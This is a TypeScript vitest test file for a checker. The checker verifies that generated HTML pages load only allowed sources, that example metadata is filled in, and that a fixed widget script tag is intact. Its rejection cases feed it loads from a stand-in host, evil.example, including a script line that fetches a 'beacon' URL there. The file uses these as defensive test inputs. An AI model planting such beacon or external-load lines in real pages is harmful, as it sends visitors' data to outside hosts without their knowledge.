import { describe, expect, it } from "vitest";
import {
  checkExampleMeta,
  checkPageWidget,
  checkSelfContained,
} from "./check-ideas.ts";
import type { ExampleMeta } from "./ideas.ts";

function errorsFor(html: string): string[] {
  const errors: string[] = [];
  checkSelfContained("page.html", html, errors);
  return errors;
}

describe("checkSelfContained", () => {
  it("passes the four families a starter is allowed to load", () => {
    expect(
      errorsFor(`
        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter" />
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@phosphor-icons/web@2.1.2/src/regular/style.css" />
        <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4.1.11"></script>
      `),
    ).toEqual([]);
  });

  it("passes an inline image and an inline script", () => {
    expect(
      errorsFor(`
        <img src="data:image/jpeg;base64,/9j/4AAQ" />
        <script>document.title = "fine";</script>
      `),
    ).toEqual([]);
  });

  it("leaves hyperlinks alone, wherever they point", () => {
    expect(
      errorsFor(`<a href="https://www.example.com/a-product">A product</a>`),
    ).toEqual([]);
  });

  // Each of these loaded from the network while passing the older check, which
  // only recognized a double-quoted href or src on a short list of tags.
  it.each([
    ["a single-quoted src", `<img src='https://evil.example/a.jpg' />`],
    ["an unquoted src", `<img src=https://evil.example/a.jpg />`],
    ["a srcset candidate", `<img srcset="https://evil.example/a.jpg 2x" />`],
    ["a video poster", `<video poster="https://evil.example/f.jpg"></video>`],
    [
      "a CSS url() in a style attribute",
      `<div style="background-image:url(https://evil.example/b.jpg)"></div>`,
    ],
    [
      "a CSS url() in a style block",
      `<style>body{background:url('https://evil.example/b.jpg')}</style>`,
    ],
  ])("rejects %s", (_name, html) => {
    expect(errorsFor(html)).toHaveLength(1);
  });

  it("rejects a host that merely starts with an allowed one", () => {
    expect(
      errorsFor(
        `<link rel="stylesheet" href="https://fonts.googleapis.com.evil.example/x.css" />`,
      ),
    ).toMatchInlineSnapshot(`
      [
        "page.html: loads https://fonts.googleapis.com.evil.example/x.css, which is not an allowed source",
      ]
    `);
  });

  it("passes the favicon address a script is allowed to build", () => {
    expect(
      errorsFor(
        `<script>icon.src = "https://t0.gstatic.com/faviconV2?size=64&url=" + encodeURIComponent(origin);</script>`,
      ),
    ).toEqual([]);
  });

  it("rejects any other address a script builds at runtime", () => {
    expect(
      errorsFor(`<script>fetch("https://evil.example/beacon?p=1");</script>`),
    ).toMatchInlineSnapshot(`
      [
        "page.html: a script reaches https://evil.example/beacon?p=1; only https://t0.gstatic.com may be built at runtime",
      ]
    `);
  });

  it("rejects an allowed origin serving a path outside its family", () => {
    expect(
      errorsFor(
        `<script src="https://cdn.jsdelivr.net/npm/something-else@1.0.0/x.js"></script>`,
      ),
    ).toHaveLength(1);
  });
});

describe("checkExampleMeta", () => {
  const complete = {
    title: "Six project tools for a 12-person agency",
    variant: "Six options as columns, in bands you open one at a time",
    prompt: "Compare six project tools for an agency that bills by the hour.",
    model: "claude-fable-5-1",
    note: "Wide grid, options as columns, four attribute bands.",
  } satisfies ExampleMeta;

  function errorsForMeta(meta: ExampleMeta): string[] {
    const errors: string[] = [];
    checkExampleMeta("examples/agency-project-tools", meta, errors);
    return errors;
  }

  it("passes a complete design note", () => {
    expect(errorsForMeta(complete)).toEqual([]);
  });

  // The shape capture used to write for an example whose sidecar was missing:
  // every key present, so the older check passed it.
  it("rejects the blank sidecar capture used to manufacture", () => {
    expect(
      errorsForMeta({
        title: "agency-project-tools",
        variant: "",
        prompt: "",
        model: "",
        note: "",
      }),
    ).toMatchInlineSnapshot(`
      [
        "examples/agency-project-tools.json needs a non-empty "variant"",
        "examples/agency-project-tools.json needs a non-empty "prompt"",
        "examples/agency-project-tools.json needs a non-empty "model"",
        "examples/agency-project-tools.json needs a non-empty "note"",
      ]
    `);
  });

  it("rejects a field that is only whitespace", () => {
    expect(errorsForMeta({ ...complete, note: "   " })).toHaveLength(1);
  });

  it("rejects a variant too long to sit on a card", () => {
    expect(
      errorsForMeta({ ...complete, variant: "x".repeat(81) }),
    ).toHaveLength(1);
  });
});

describe("checkPageWidget", () => {
  function widgetErrors(html: string): string[] {
    const errors: string[] = [];
    checkPageWidget("page.html", html, errors);
    return errors;
  }

  it("passes the tag every page carries", () => {
    expect(
      widgetErrors(`<head><script async src="https://tryinstrument.com/page.js"></script></head>`),
    ).toEqual([]);
  });

  it("reports a page that has no tag at all", () => {
    expect(widgetErrors("<head></head>")).toMatchInlineSnapshot(`
      [
        "page.html: no page widget tag; every page carries <script async src="https://tryinstrument.com/page.js"></script>",
      ]
    `);
  });

  // The failure this rule exists for: the page still works and still shares,
  // but to a second address, because the tag is inside what gets hashed.
  it("reports a tag that differs by a character", () => {
    expect(
      widgetErrors(
        `<head><script async src="https://tryinstrument.com/page.js" ></script></head>`,
      ),
    ).toMatchInlineSnapshot(`
      [
        "page.html: the page widget tag is modified; it must be exactly <script async src="https://tryinstrument.com/page.js"></script>, byte for byte, or the page publishes to a different address",
      ]
    `);
  });

  it("reports a tag that dropped async", () => {
    expect(
      widgetErrors(
        `<head><script src="https://tryinstrument.com/page.js"></script></head>`,
      ),
    ).toMatchInlineSnapshot(`
      [
        "page.html: the page widget tag is modified; it must be exactly <script async src="https://tryinstrument.com/page.js"></script>, byte for byte, or the page publishes to a different address",
      ]
    `);
  });
});
